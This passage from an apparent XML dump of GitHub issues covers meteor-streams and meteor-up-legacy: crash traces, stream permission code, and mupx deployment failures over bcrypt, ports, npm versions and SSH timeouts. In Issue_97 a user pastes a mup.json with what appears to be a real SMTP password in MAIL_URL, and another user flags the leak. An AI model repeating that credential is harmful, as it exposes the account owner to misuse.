    at /Applications/MAMP/htdocs/frequentis/ms-homepage/.meteor/local/build/server/server.js:298:12
    at Array.forEach (native)
    at Function._.each._.forEach (/Users/manfredspecht/.meteor/tools/cc18dfef9e/lib/node_modules/underscore/underscore.js:78:11)
    at run (/Applications/MAMP/htdocs/frequentis/ms-homepage/.meteor/local/build/server/server.js:239:7)
=&gt; Exited with code: 1
=&gt; Your application is crashing. Waiting for file change.
</Body>
    <State>open</State>
    <Comment>
      <Owner>Yael95</Owner>
      <Body>I have the same issue please can someone answer
</Body>
    </Comment>
  </Issue_86>
  <Issue_87>
    <Repository>meteor-streams</Repository>
    <Title>emit not working - not emiting to all clients and Random is not defined.</Title>
    <Owner>arunoda</Owner>
    <Body>Just in stalled Streams and added the standard example code (with correct permissions)

chatStream = new Meteor.Stream('chat');

sendChat = function(message) {
    chatStream.emit('message', message);
    console.log('me: ' + message);
};

chatStream.on('message', function(message, arg) {
    console.log(arg);
    console.log('user: ' + message);
});

I run into the following two errors:
1. When I load my Meteor app for the first time I get the following exception:
   I20151005-11:50:11.732(1)? Exception from sub stream-chat id S6sjbJYZ3zn4wLr8f ReferenceError: Random is not defined
   I20151005-11:50:11.734(1)?     at [object Object]._handler (packages/streams/lib/server.js:40:1)
   I20151005-11:50:11.734(1)?     at maybeAuditArgumentChecks (livedata_server.js:1692:12)
   I20151005-11:50:11.734(1)?     at [object Object]._.extend._runHandler (livedata_server.js:1023:17)
   I20151005-11:50:11.734(1)?     at [object Object]._.extend._startSubscription (livedata_server.js:842:9)
   I20151005-11:50:11.734(1)?     at [object Object]._.extend.protocol_handlers.sub (livedata_server.js:614:12)
   I20151005-11:50:11.734(1)?     at livedata_server.js:548:43
   I20151005-11:50:13.321(1)? Exception from sub stream-chat id 7bv8NZNAp7pP9KT8G ReferenceError: Random is not defined
   I20151005-11:50:13.321(1)?     at [object Object]._handler (packages/streams/lib/server.js:40:1)
   I20151005-11:50:13.321(1)?     at maybeAuditArgumentChecks (livedata_server.js:1692:12)
   I20151005-11:50:13.321(1)?     at [object Object]._.extend._runHandler (livedata_server.js:1023:17)
   I20151005-11:50:13.321(1)?     at [object Object]._.extend._startSubscription (livedata_server.js:842:9)
   I20151005-11:50:13.321(1)?     at [object Object]._.extend.protocol_handlers.sub (livedata_server.js:614:12)
   I20151005-11:50:13.322(1)?     at livedata_server.js:548:43
2. Events are not emitted to all clients, only the sender. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>team-pie</Owner>
      <Body>has this been fixed? I'm having a similar issue
</Body>
    </Comment>
    <Comment>
      <Owner>kusmierz</Owner>
      <Body>Try add to your app package [Random](https://atmospherejs.com/meteor/random):

``` bash
meteor add random
```
</Body>
    </Comment>
    <Comment>
      <Owner>team-pie</Owner>
      <Body>Yeah I did that. Thanks. Would be nice to include it in the dependencies
</Body>
    </Comment>
    <Comment>
      <Owner>kusmierz</Owner>
      <Body>@papero-co I think so too, but unfortunately it seems the project is no longer maintained :( see #21
</Body>
    </Comment>
    <Comment>
      <Owner>team-pie</Owner>
      <Body>I've seen that. I could not tell if @lepozepo had taken over. Anyway problem fixed for me :)
</Body>
    </Comment>
  </Issue_87>
  <Issue_88>
    <Repository>meteor-streams</Repository>
    <Title>Streaming Video Camera</Title>
    <Owner>arunoda</Owner>
    <Body>Hi Arunoda

I have a requirement for streaming live video from my phone camera and/or attaching a photo to the blackboard.

Is this possible?

Many Thanks
Leon
</Body>
    <State>open</State>
    <Comment>
      <Owner>Xample</Owner>
      <Body>Streams is intended to steam messages, not multimedia content. As you technically speaking might be able to encode your images and sound into a base64 message and decode on the client side I strongly doubt you will get any good result this way.
</Body>
    </Comment>
  </Issue_88>
  <Issue_89>
    <Repository>meteor-streams</Repository>
    <Title>Can a server listen to a stream in another server?</Title>
    <Owner>arunoda</Owner>
    <Body>Hi.

I have different meteor apps and I want to synchronize streams between them.
A way for cluster (http://arunoda.github.io/meteor-streams/scaling-support.html
) seems not suitable.

Is there any way that a server listens to a stream in another server?
</Body>
    <State>open</State>
    <Comment>
      <Owner>JeremySaks</Owner>
      <Body>@y-ich can you provide a code sample for how to configure your fork https://github.com/y-ich/meteor-streams to receive streams from another app?
</Body>
    </Comment>
  </Issue_89>
  <Issue_90>
    <Repository>meteor-streams</Repository>
    <Title>Optimization: customize the publish/subscribe methods</Title>
    <Owner>arunoda</Owner>
    <Body>Is there some way we could customize the publish/subscribe methods for the collection?

In my use case, I only need to monitor messages dependant on a Session variable.  

That is, 95% of my clients don't care at all, and wont render/act upon any notifications.

Were this a normal publish/subscribe, I could base the subscribe upon the Session variables.

While the code runs fine, with the Session variable restrictions being handled in the `on()` handler, it's not optimal.  _All clients are getting all messages_

And yes, I know I can restrict based on the `Meteor.userId` but in the case of this app, most clients are anon.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>How does this relates to meteor-streams?

This might [help](http://docs.meteor.com/#observe) you anyway.
</Body>
    </Comment>
    <Comment>
      <Owner>zeroasterisk</Owner>
      <Body>(sry - I accidentally submitted the question too early - just edited)
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Hope this would work.

``` js
Notifications = Meteor.Streams('notifications');

if(Meteor.isClient) {
  Notifications.emit('active', true);
}

if(Meteor.isServer) {
  var states = {};
  Notifications.on('active', function(state) {
    states[this.subscriptionId] = state;
    this.onDisconnect = function() {
      delete states[this.subscriptionId]
    };
  });

  Notifications.permissions.read(function() {
    return !!states[this.subscriptionId];
  }, false);
}
```

Anyway, we need a better and simple easy way to do this. I will add a new API. But not sure about the timeline.
</Body>
    </Comment>
    <Comment>
      <Owner>zeroasterisk</Owner>
      <Body>**SWEET!**  _thanks for the plugin, thanks for helping me, and thanks for the ninja-fast response._

As I read this
- no client would be "subscribed" (no messages sent on) until it had sent through the `.emit('active', true);` 
- and once that has happened, other messages would be passed like normal like `.emit('sent', 'yup this is sent');`
- until `.emit('active', false);` is sent in by this client

is that correct?

### Brainstorming

If mine is an edge case, this should be a sufficient workaround.  

The concept of "listening = true/false" seems like a simple enough one to implement (perhaps a slightly cleaner implementation than your above code, but functionally the same).  It isn't as versatile/direct as customizing the publish/subscribe, but it is a heck of a lot easier and simpler.

If you think customizing the publish/subscribe "rules" for notifications is a common enough use case, perhaps you could provide default publish/subscribe, allowing developers to manually assign if they had custom rules. (?) Or maybe you could look for a `streams.subscribe()` method, which could be run on the client to determine if it should subscribe. (?)
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Yes you are correct. You've to do allow write permissions also. If `emited` from a client

``` js
Notifications.permissions.read(function() {
  return true
});
```

Your suggestion on the API is good. I'll consider it :+1: 
I'm thinking about new easy to understand API. I'll publish more info as I go through it.
</Body>
    </Comment>
  </Issue_90>
  <Issue_91>
    <Repository>meteor-streams</Repository>
    <Title>Docs on API</Title>
    <Owner>arunoda</Owner>
    <Body>Currently there is no such API doc on the docs site. Add it.
</Body>
    <State>open</State>
    <Comment>
      <Owner>dillongreen</Owner>
      <Body>yes, that would be great... this package is to amazing to not have it... more folks will start using it if there's some API docs imo
</Body>
    </Comment>
  </Issue_91>
  <Issue_92>
    <Repository>meteor-streams</Repository>
    <Title>Use internal Meteor._Stream instead Pub/Sub</Title>
    <Owner>arunoda</Owner>
    <Body>Current implementation uses Pub/Sub and a Method to mimic a Stream. It is not anything bad. 

But it will great if we can use the underline `Meteor._Stream`[1] as the transport.

[1] - http://stackoverflow.com/a/16703770/457224
</Body>
    <State>open</State>
    <Comment>
      <Owner>YuukanOO</Owner>
      <Body>I just released a package which use the internal meteor stream to do real time communication, see https://github.com/YuukanOO/streamy in case anyone is interested.
</Body>
    </Comment>
  </Issue_92>
  <Issue_93>
    <Repository>meteor-up-legacy</Repository>
    <Title>deployment failure with bcrypt!</Title>
    <Owner>arunoda</Owner>
    <Body>I try to deploy meteor app with mupx. but got error after `mupx deploy` command. logs:&#13;
&#13;
```&#13;
Meteor Up: Production Quality Meteor Deployments&#13;
------------------------------------------------&#13;
Configuration file : mup.json&#13;
Settings file      : settings.json&#13;
&#13;
[138.68.88.155] npm WARN deprecated If you're running the version of npm bundled&#13;
 with&#13;
[138.68.88.155] npm WARN deprecated Node.js 0.10 LTS, be aware that the next ver&#13;
sion of 0.10 LTS&#13;
[138.68.88.155] npm WARN deprecated will be bundled with a version of npm@2, whi&#13;
ch has some small&#13;
[138.68.88.155] npm WARN deprecated backwards-incompatible changes made to `npm&#13;
run-script` and&#13;
[138.68.88.155] npm WARN deprecated semver behavior.&#13;
[138.68.88.155] npm WARN package.json meteor-dev-bundle@0.0.0 No description&#13;
[138.68.88.155] npm WARN package.json meteor-dev-bundle@0.0.0 No repository fiel&#13;
d.&#13;
[138.68.88.155] npm WARN package.json meteor-dev-bundle@0.0.0 No README data&#13;
[138.68.88.155] npm WARN cannot run in wd meteor-dev-bundle@0.0.0 node npm-rebui&#13;
ld.js (wd=/bundle/bundle/programs/server)&#13;
[138.68.88.155] =&gt; Starting meteor app on port:80&#13;
[138.68.88.155]&#13;
[138.68.88.155] /bundle/bundle/programs/server/node_modules/fibers/future.js:280&#13;
&#13;
[138.68.88.155]                                                 throw(ex);&#13;
[138.68.88.155]                                                       ^&#13;
[138.68.88.155] Error: /bundle/bundle/programs/server/npm/node_modules/meteor/np&#13;
m-bcrypt/node_modules/bcrypt/build/Release/bcrypt_lib.node: undefined symbol: no&#13;
de_module_register&#13;
[138.68.88.155]     at Module.load (module.js:356:32)&#13;
[138.68.88.155]     at Module.Mp.load (/bundle/bundle/programs/server/npm/node_m&#13;
odules/meteor/babel-compiler/node_modules/reify/node/runtime.js:16:23)&#13;
[138.68.88.155]     at Function.Module._load (module.js:312:12)&#13;
[138.68.88.155]     at Module.require (module.js:364:17)&#13;
[138.68.88.155]     at require (module.js:380:17)&#13;
[138.68.88.155]     at bindings (/bundle/bundle/programs/server/npm/node_modules&#13;
/meteor/npm-bcrypt/node_modules/bindings/bindings.js:76:44)&#13;
[138.68.88.155]     at Object.&lt;anonymous&gt; (/bundle/bundle/programs/server/npm/no&#13;
de_modules/meteor/npm-bcrypt/node_modules/bcrypt/bcrypt.js:3:35)&#13;
[138.68.88.155]     at Module._compile (module.js:456:26)&#13;
[138.68.88.155]     at Object.Module._extensions..js (module.js:474:10)&#13;
[138.68.88.155]     at Module.load (module.js:356:32)&#13;
[138.68.88.155] npm WARN deprecated This version of npm lacks support for import&#13;
ant features,&#13;
[138.68.88.155] npm WARN deprecated such as scoped packages, offered by the prim&#13;
ary npm&#13;
[138.68.88.155] npm WARN deprecated registry. Consider upgrading to at least npm&#13;
@2, if not the&#13;
[138.68.88.155] npm WARN deprecated latest stable version. To upgrade to npm@2,&#13;
run:&#13;
[138.68.88.155] npm WARN deprecated&#13;
[138.68.88.155] npm WARN deprecated   npm -g install npm@latest-2&#13;
[138.68.88.155] npm WARN deprecated&#13;
[138.68.88.155] npm WARN deprecated To upgrade to the latest stable version, run&#13;
:&#13;
[138.68.88.155] npm WARN deprecated&#13;
[138.68.88.155] npm WARN deprecated   npm -g install npm@latest&#13;
[138.68.88.155] npm WARN deprecated&#13;
[138.68.88.155] npm WARN deprecated (Depending on how Node.js was installed on y&#13;
our system, you&#13;
[138.68.88.155] npm WARN deprecated may need to prefix the preceding commands wi&#13;
th `sudo`, or if&#13;
[138.68.88.155] npm WARN deprecated on Windows, run them from an Administrator p&#13;
rompt.)&#13;
[138.68.88.155] npm WARN deprecated&#13;
[138.68.88.155] npm WARN deprecated If you're running the version of npm bundled&#13;
 with&#13;
[138.68.88.155] npm WARN deprecated Node.js 0.10 LTS, be aware that the next ver&#13;
sion of 0.10 LTS&#13;
[138.68.88.155] npm WARN deprecated will be bundled with a version of npm@2, whi&#13;
ch has some small&#13;
[138.68.88.155] npm WARN deprecated backwards-incompatible changes made to `npm&#13;
run-script` and&#13;
[138.68.88.155] npm WARN deprecated semver behavior.&#13;
[138.68.88.155] npm WARN package.json meteor-dev-bundle@0.0.0 No description&#13;
[138.68.88.155] npm WARN package.json meteor-dev-bundle@0.0.0 No repository fiel&#13;
d.&#13;
[138.68.88.155] npm WARN package.json meteor-dev-bundle@0.0.0 No README data&#13;
[138.68.88.155] npm WARN cannot run in wd meteor-dev-bundle@0.0.0 node npm-rebui&#13;
ld.js (wd=/bundle/bundle/programs/server)&#13;
[138.68.88.155] =&gt; Starting meteor app on port:80&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>goquiet</Owner>
      <Body>please help! what can I do ? what are possible solutions?</Body>
    </Comment>
  </Issue_93>
  <Issue_94>
    <Repository>meteor-up-legacy</Repository>
    <Title>Invoking deployment process: FAILED when mupx deploy</Title>
    <Owner>arunoda</Owner>
    <Body>I'm using Ubuntu Server 16.04 LTS (HVM), When I do a &#13;
&#13;
&gt; mupx deploy&#13;
&#13;
 I get the following error:&#13;
&#13;
Started TaskList: Deploy app 'myApp' (linux)&#13;
[my IP address] - Uploading bundle&#13;
[my IP address] - Uploading bundle: SUCCESS&#13;
[my IP address] - Sending environment variables&#13;
[my IP address] - Sending environment variables: SUCCESS&#13;
[my IP address] - Initializing start script&#13;
[my IP address] - Initializing start script: SUCCESS&#13;
[my IP address] - Invoking deployment process&#13;
[my IP address] x Invoking deployment process: FAILED&#13;
&#13;
 -----------------------------------STDERR-----------------------------------&#13;
 Error response from daemon: No such container: myApp&#13;
 Error response from daemon: No such container: myApp-frontend&#13;
 docker: Error response from daemon: driver failed programming external connectivity on endpoint myApp (0f9a98d2dee0c6b96e9073f2097cea40aeec7a8735d5404a68c92cf06c77714d): Bind for 0.0.0.0:3000 failed: port is already allocated.&#13;
 -----------------------------------STDOUT-----------------------------------&#13;
 base: Pulling from meteorhacks/meteord&#13;
 4d690f9d8655: Already exists&#13;
 a3ed95caeb02: Already exists&#13;
 0638f87c6191: Already exists&#13;
 086f3wo36259: Already exists&#13;
 Digest: sha256:6819204facd5847f6a4ee2dfdf92w9weujd492018261294061914d43fd0eb340b&#13;
 Status: Image is up to date for meteorhacks/meteord:base&#13;
 f1c7efb60a310e02dadadf04r4sdfdjj211ac9571abf7d8d2218e2ea206c13&#13;
 ----------------------------------------------------------------------------&#13;
&#13;
Appreciate ur help!</Body>
    <State>open</State>
    <Comment>
      <Owner>Anto95</Owner>
      <Body>Dear fisherman818,&#13;
Have you solved this problem at the end? I am in the same situation...</Body>
    </Comment>
  </Issue_94>
  <Issue_95>
    <Repository>meteor-up-legacy</Repository>
    <Title>Verifying deployment: FAILED; curl: (56) Recv failure: Connection reset by peer</Title>
    <Owner>arunoda</Owner>
    <Body>Getting this multiple times in a row. Not sure if this is an issue with mupx or something on the server. The app deploys successfully, but then silently fails and does not come back up. 

Latest mupx (1.5.3) with meteorhacks docker image replaced with abernix/meteord:base, as described as a solution in various issues.

Mupx outputs this error:

```
x Verifying deployment: FAILED

    -----------------------------------STDERR-----------------------------------
      Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (56) Recv failure: Connection reset by peer
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (56) Recv failure: Connection reset by peer
```

The connection (and server) are fine - tried multiple internet connections (4 different wired and wireless networks - fibre optic based AND 4G, no difference - so cannot really be a connection issue on my end (or the server's - it's a Linode VPS and they should not be having any issues, currently)).

mupx logs --tail=50 shows normal server console, the same stuff I see locally. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>arggh</Owner>
      <Body>Just got hit by this and now all my app servers are down.

```
x Verifying Deployment: FAILED

    -----------------------------------STDERR-----------------------------------
              Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
    curl: (52) Empty reply from server
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
    curl: (52) Empty reply from server
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
    curl: (52) Empty reply from server

    =&gt; Redeploying previous version of the app

    -----------------------------------STDOUT-----------------------------------

    To see more logs type 'mup logs --tail=50'

    ----------------------------------------------------------------------------
```
</Body>
    </Comment>
    <Comment>
      <Owner>bryanlimy</Owner>
      <Body>same problem I have tried on a clean server
I also looked into this issue https://github.com/meteor/meteor/issues/7475, but adding `dockerImage: 'abernix/meteord:base'` in `mup.json` didn't fix the issue 
</Body>
    </Comment>
  </Issue_95>
  <Issue_96>
    <Repository>meteor-up-legacy</Repository>
    <Title>How to change the node version in meteor up and how to check the installed node my mupx on aws ec2 by ssh</Title>
    <Owner>arunoda</Owner>
    <Body>Hi,

I am getting error while deploying the meteor 1.3  and meteor 1.4 project to aws ubuntu ec2.

the error complains about the npm version , saying that the npm version should atleast be 2  and it cannot read /bundle/package.json 

In the mup.json file i changed the node version to 6.7.0 and others so that i get the npm which is greater or equal to version 2. After changing i again ran mupx setup, mupx deploy but again the same error, and in logs i could see that the node and npm version are not changed

 -----------------------------------STDERR-----------------------------------
        npm@2, which has some small
        npm WARN deprecated backwards-incompatible changes made to `npm run-script` and
        npm WARN deprecated semver behavior.
        npm ERR! install Couldn't read dependencies
        npm ERR! Failed to parse json
        npm ERR! Unexpected end of input
        npm ERR! File: /bundle/bundle/programs/server/package.json
        npm ERR! Failed to parse package.json data.
        npm ERR! package.json must be actual JSON, not just JavaScript.
        npm ERR! 
        npm ERR! This is not a bug in npm.
        npm ERR! Tell the package author to fix their package.json file. JSON.parse

```
    npm ERR! System Linux 3.13.0-98-generic
    npm ERR! command "/usr/bin/node" "/usr/bin/npm" "i"
    npm ERR! cwd /bundle/bundle/programs/server
    npm ERR! node -v v0.10.43
    npm ERR! npm -v 1.4.29
    npm ERR! file /bundle/bundle/programs/server/package.json
    npm ERR! code EJSONPARSE
    npm ERR! 
    npm ERR! Additional logging details can be found in:
    npm ERR!     /bundle/bundle/programs/server/npm-debug.log
    npm ERR! not ok code 0

    =&gt; Redeploying previous version of the app

    -----------------------------------STDOUT-----------------------------------

    To see more logs type 'mup logs --tail=50'

    ----------------------------------------------------------------------------
```

So i thought of manually logging to the aws instance and change the node version over there.

when i logged, firstly when i ran some commands like meteor, node i could see that commands are not found and when i had ran mupx setup it had successfully set up the system.

So next i installed node and npm to the latest version and i came back to my meteor project.
I changed the  mup.json file by commenting on setupNode,because i already have node to my latest version on my aws ec2 ubuntu.

I ran mupx setup, mupx deploy but again the same error.

So the question is how do i actually change my node version for the meteor project and how does mup setup up the environment on the ec2 instance and where on it, as when i logged in i could not see any commad being accepted, So how does the meteor pick up the installed dependencies and from where.
</Body>
    <State>open</State>
    <Comment>
      <Owner>evallgar</Owner>
      <Body>Same here. I think this could be some problem of local node version. When I do:&#13;
`$ node --version`&#13;
I get&#13;
`v7.1.0`  //This is the appropiate version for Ionic framework which I also use.&#13;
&#13;
When trying to deploy, at verifying deployment i get the following error:&#13;
` x Verifying deployment: FAILED&#13;
&#13;
 -----------------------------------STDERR-----------------------------------&#13;
  npm@2, which has some small&#13;
 npm WARN deprecated backwards-incompatible changes made to `npm run-script` and&#13;
 npm WARN deprecated semver behavior.&#13;
 npm ERR! install Couldn't read dependencies&#13;
 npm ERR! Failed to parse json&#13;
 npm ERR! Unexpected end of input&#13;
 npm ERR! File: /bundle/bundle/programs/server/package.json&#13;
 npm ERR! Failed to parse package.json data.&#13;
 npm ERR! package.json must be actual JSON, not just JavaScript.&#13;
 npm ERR!&#13;
 npm ERR! This is not a bug in npm.&#13;
 npm ERR! Tell the package author to fix their package.json file. JSON.parse&#13;
&#13;
 npm ERR! System Linux 4.4.0-47-generic&#13;
 npm ERR! command "/usr/bin/node" "/usr/bin/npm" "i"&#13;
 npm ERR! cwd /bundle/bundle/programs/server&#13;
 npm ERR! node -v v0.10.43&#13;
 npm ERR! npm -v 1.4.29&#13;
 npm ERR! file /bundle/bundle/programs/server/package.json&#13;
 npm ERR! code EJSONPARSE&#13;
 npm ERR!&#13;
 npm ERR! Additional logging details can be found in:&#13;
 npm ERR!     /bundle/bundle/programs/server/npm-debug.log&#13;
 npm ERR! not ok code 0&#13;
&#13;
 =&gt; Redeploying previous version of the app&#13;
&#13;
 -----------------------------------STDOUT-----------------------------------&#13;
&#13;
 To see more logs type 'mup logs --tail=50'&#13;
&#13;
 ----------------------------------------------------------------------------`</Body>
    </Comment>
  </Issue_96>
  <Issue_97>
    <Repository>meteor-up-legacy</Repository>
    <Title>Issue deploying to AWS</Title>
    <Owner>arunoda</Owner>
    <Body>I have successfully deployed to my AWS ubuntu server, however I can't get the webpage to load, and it always gets redirected to https.  Does anyone have any idea what might be causing this issue?  Or what might be causing the redirect to https?

Thank you  

ec2-54-191-111-45.us-west-2.compute.amazonaws.com
</Body>
    <State>open</State>
    <Comment>
      <Owner>gsabran</Owner>
      <Body>can you share your mup config? Is your instance set up to receive traffic on port 80 and 443?
</Body>
    </Comment>
    <Comment>
      <Owner>trevordowdle</Owner>
      <Body>Thank you for your response,

here is my mup.json file and yes I had my instance setup to receive traffic on port 80 and 443.

&gt; {
&gt;   // Server authentication info
&gt;   "servers": [
&gt;     {
&gt;       "host": "54.191.111.45",
&gt;       "username": "ubuntu",
&gt;       //"password": "password"
&gt;       // or pem file (ssh based authentication)
&gt;       "pem": "~/Meteor/bvSecure.pem"
&gt;     }
&gt;   ],
&gt; 
&gt;   // Install MongoshB in the server, does not destroy local MongoshB on future setup
&gt;   "setupMongo": true,
&gt; 
&gt;   // Show a progress bar during the upload of the bundle to the server. 
&gt;   // Might cause an error in some rare cases if set to true, for instance in Shippable CI
&gt;   "enableUploadProgressBar": true,
&gt; 
&gt;   // Application name (No spaces)
&gt;   "appName": "boldvue",
&gt; 
&gt;   // Location of app (local directory)
&gt;   "app": "~/Meteor/convert/boldvue-convert",
&gt; 
&gt;   // Configure environment
&gt;   "env": {
&gt;     "ROOT_URL": "http://ec2-54-191-111-45.us-west-2.compute.amazonaws.com",
&gt;     "MAIL_URL": "smtp://SMTP_Injection:3cfd1f52be7605f71792b232e41b5c19728599c5@smtp.sparkpostmail.com:587"
&gt;   },
&gt; 
&gt;   // Meteor Up checks if the app comes online just after the deployment
&gt;   // before mup checks that, it will wait for no. of seconds configured below
&gt;   "deployCheckWaitTime": 30
&gt; }
</Body>
    </Comment>
    <Comment>
      <Owner>gsabran</Owner>
      <Body>hum that surprising because you don't seem to be setting anything for https. Also make sure to not share your db/mail credentials in github :) Not sure if they're valid but you should replace `"mongodb://tre..."` by `"&lt;some-mongo-url&gt;" so that it's enough to understand the context, but not enough to connect to your db!
</Body>
    </Comment>
    <Comment>
      <Owner>trevordowdle</Owner>
      <Body>whoops Thank you for bringing that to my attention.  Those lines were commented out and so weren't really pertinent so I removed them.  Thanks again.
</Body>
    </Comment>
  </Issue_97>
  <Issue_98>
    <Repository>meteor-up-legacy</Repository>
    <Title>Meteor Version 1.3.5.1 app not working on Redeploy</Title>
    <Owner>arunoda</Owner>
    <Body>I have tried the following experiments:
- Deploying on DigitalOcean Ubuntu Server: All OK
- Deploying on virtual Ubuntu Server (first time) (i had to install openssh-server and docker) I get the **bellow error, but the application works!**

```
Verifying deployment: FAILED

        -----------------------------------STDERR-----------------------------------
        run:
        npm WARN deprecated
        npm WARN deprecated   npm -g install npm@latest

        npm WARN deprecated
        npm WARN deprecated (Depending on how Node.js was installed on your system, you
        npm WARN deprecated may need to prefix the preceding commands with `sudo`, or if
        npm WARN deprecated on Windows, run them from an Administrator prompt.)
        npm WARN deprecated
        npm WARN deprecated If you're running the version of npm bundled with
        npm WARN deprecated Node.js 0.10 LTS, be aware that the next version of 0.10 LTS
        npm WARN deprecated will be bundled with a version of npm@2, which has some small
        npm WARN deprecated backwards-incompatible changes made to `npm run-script` and
        npm WARN deprecated semver behavior.
        npm WARN package.json meteor-dev-bundle@0.0.0 No description
        npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
        npm WARN package.json meteor-dev-bundle@0.0.0 No README data

        &gt; fibers@1.0.13 install /bundle/bundle/programs/server/node_modules/fibers
        &gt; node build.js || nodejs build.js

        -----------------------------------STDOUT-----------------------------------

        To see more logs type 'mup logs --tail=50'

        ----------------------------------------------------------------------------
```

ReDeploying i get the bellow errors, and **the app is not working anymore.**
Can someone tell why?

```
x Verifying deployment: FAILED

        -----------------------------------STDERR-----------------------------------
         npm -g install npm@latest
        npm WARN deprecated
        npm WARN deprecated (Depending on how Node.js was installed on your system, you
        npm WARN deprecated may need to prefix the preceding commands with `sudo`, or if
        npm WARN deprecated on Windows, run them from an Administrator prompt.)
        npm WARN deprecated
        npm WARN deprecated If you're running the version of npm bundled with
        npm WARN deprecated Node.js 0.10 LTS, be aware that the next version of 0.10 LTS
        npm WARN deprecated will be bundled with a version of npm@2, which has some small
        npm WARN deprecated backwards-incompatible changes made to `npm run-script` and
        npm WARN deprecated semver behavior.
        npm WARN package.json meteor-dev-bundle@0.0.0 No description
        npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
        npm WARN package.json meteor-dev-bundle@0.0.0 No README data

        &gt; fibers@1.0.13 install /bundle/bundle/programs/server/node_modules/fibers
        &gt; node build.js || nodejs build.js


        =&gt; Redeploying previous version of the app

        -----------------------------------STDOUT-----------------------------------

        To see more logs type 'mup logs --tail=50'

        ----------------------------------------------------------------------------
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>hems</Owner>
      <Body>how did you fix that problem? it suddenly started happening for me, out of the blue and i can't get it to work.&#13;
&#13;
even deploying to a new machine</Body>
    </Comment>
    <Comment>
      <Owner>muscaiu</Owner>
      <Body>I gave up `mupx`, updated to Meteor 1.4 and started using https://github.com/kadirahq/meteor-up </Body>
    </Comment>
  </Issue_98>
  <Issue_99>
    <Repository>meteor-up-legacy</Repository>
    <Title>Error: Timed out while waiting for handshake?</Title>
    <Owner>arunoda</Owner>
    <Body>Mup.json

```
{
  "servers": [
    {
      "host": "172.17.0.2",
      "username": "root",
      "pem": "~/.ssh/id_rsa",
      "sshOptions": {
        "port": 12345
      },
      "env": {}
    }
  ],
  "setupMongo": true,
  "setupNode": true,
  "setupPhantom": true,
  "nodeVersion": "0.10.40",
  "appName": "spark2acs",
  "app": "..",
  "env": {
    "PORT": 3012,
    "ROOT_URL": "http://172.17.0.2/",
    "CLUSTER_WORKERS_COUNT": "auto",
    "MONGO_URL": "mongodb://@localhost:27017/meteor"
  },
  "deployCheckWaitTime": 600,
  "enableUploadProgressBar": true
}


Installing Docker
events.js:141
      throw er; // Unhandled 'error' event
      ^

Error: Timed out while waiting for handshake
    at null._onTimeout (/usr/local/lib/node_modules/mupx/node_modules/nodemiral/node_modules/ssh2/lib/client.js:138:17)
    at Timer.listOnTimeout (timers.js:92:15)

```
</Body>
    <State>open</State>
    <Comment>
      <Owner>trevordowdle</Owner>
      <Body>Having same issue here
</Body>
    </Comment>
    <Comment>
      <Owner>trevordowdle</Owner>
      <Body>If I remove 

"sshOptions": {
        "port": 12345
      }

I can get it to go through in MUPX - https://github.com/kadirahq/meteor-up
</Body>
    </Comment>
    <Comment>
      <Owner>edu2969</Owner>
      <Body>I tried deploy the same proyect in 2 diferents servers, the only difference between them its the IP, SSH and HTTP ports&#13;
&#13;
Machine 1: configured with local ip 192.168.x.xxx, SSH 22, HTTP 80&#13;
Machine 2: configures with private IP, SSH 2221, HTTP 8081&#13;
&#13;
But, in the machine 2, mupx setup  give the error:&#13;
&#13;
```&#13;
Installing Docker&#13;
events.js:141&#13;
      throw er; // Unhandled 'error' event&#13;
      ^&#13;
&#13;
Error: Timed out while waiting for handshake&#13;
    at null._onTimeout (/usr/local/lib/node_modules/mupx/node_modules/nodemiral/node_modules/ssh2/lib/client.js:138:17)&#13;
    at Timer.listOnTimeout (timers.js:92:15)&#13;
```&#13;
&#13;
The node, n, nodejs, npm, mupx, debian version are the same.&#13;
Help?</Body>
    </Comment>
    <Comment>
      <Owner>edu2969</Owner>
      <Body>Issue resolved. I was using public IP addres, then I replace for internal IP addres.&#13;
So, replace your public IP&#13;
&#13;
"host": "172.17.0.2"&#13;
&#13;
by you IP getting throw ifconfig like &#13;
&#13;
"host": "192.168.x.xxx"&#13;
&#13;
Good luck!&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>mattlinares</Owner>
      <Body>@edu2969 Hi Edu, how exactly did you find that second IP to replace the first? Thanks..&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>edu2969</Owner>
      <Body>@mattlinares, the internal IP idress is find using ifconfig command, considering your internet-interface that you are using. In my case, my server is connecting using ETHERNET port (tipically called eth0)&#13;
&#13;
```&#13;
$ sudo ifconfig&#13;
eth0      Link encap:Ethernet  HWaddr xx:xx:xx:xx:xx:xx&#13;
          inet addr:192.168.1.127  Bcast:192.168.1.255  Mask:255.255.255.0&#13;
          inet6 addr: .................../64 Scope:Link&#13;
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1&#13;
          RX packets:6726717 errors:0 dropped:0 overruns:0 frame:0&#13;
          TX packets:275809 errors:0 dropped:0 overruns:0 carrier:0&#13;
          collisions:0 txqueuelen:1000&#13;
          RX bytes:2561775346 (2.3 GiB)  TX bytes:37218918 (35.4 MiB)&#13;
```&#13;
&#13;
En the 2nd line appear the attribute inetaddr: 192.168.1.127, use it.</Body>
    </Comment>
    <Comment>
      <Owner>mattlinares</Owner>
      <Body>Thanks for this. My problem was actually that the server was down, so not connecting. The error is the same :/&#13;
&#13;
I appreciate your comment though.</Body>
    </Comment>
